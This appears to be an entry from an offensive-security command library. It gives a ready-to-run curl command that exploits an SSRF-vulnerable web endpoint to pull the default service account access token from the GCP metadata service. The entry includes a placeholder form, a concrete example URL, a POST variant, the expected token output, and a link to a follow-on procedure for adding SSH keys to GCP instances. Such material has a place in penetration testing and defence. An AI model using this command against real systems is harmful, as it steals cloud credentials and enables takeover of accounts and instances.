---
id: 33941f6c-de85-4cda-91d5-7baa34473d86
name: gcp-get-service-account-token
type: command
executor: bash
data: >-
  curl
  "http://VULNERABLE-SSRF-ENDPOINT?url=http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json"
  -H "Metadata-Flavor: Google"
output: null
created_at: '2023-04-06T03:56:38.401136+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - GCP
tags:
  - ssrf
  - gcp
  - token
verified: true
validated: true
---

# gcp-get-service-account-token

## Command

```bash
curl "http://VULNERABLE-SSRF-ENDPOINT?url=http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json" -H "Metadata-Flavor: Google"
```

## Description

This command exploits SSRF to query the GCP metadata service for the default service account's access token, enabling API authentication from external contexts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| VULNERABLE-SSRF-ENDPOINT | URL of the SSRF-vulnerable application endpoint | Yes |
| Metadata-Flavor: Google | Header required for metadata authentication | Yes |

## Examples

### Basic Usage

```bash
curl "http://example-app.com/ssrf?url=http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json" -H "Metadata-Flavor: Google"
```

### Advanced Usage

If SSRF requires POST, adapt to: curl -X POST -d 'url=...' http://vulnerable-endpoint

## Expected Output

```json
{
  "access_token": "ya29.a0AfH6SMC...",
  "expires_in": 3600,
  "token_type": "Bearer"
}
```

Extract the access_token for API calls. Errors indicate invalid SSRF path or missing scopes.

## Related

- [[procedures/Exploit-SSRF-to-Add-SSH-Key-to-GCP-Instance]]
